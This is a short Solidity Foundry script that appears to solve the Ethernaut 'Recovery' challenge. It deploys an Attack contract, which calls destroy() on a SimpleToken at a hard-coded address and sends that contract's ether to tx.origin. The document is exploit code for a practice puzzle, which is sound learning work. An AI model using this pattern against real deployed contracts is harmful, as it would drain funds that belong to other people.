// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Recovery.sol";

contract RecoveryScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        new Attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    constructor () {
        SimpleToken target;
        target = SimpleToken(payable(0x6301021DB1712cdc8166dE23543bcCdFC2296875));

        target.destroy(payable(address(tx.origin)));
    }

}
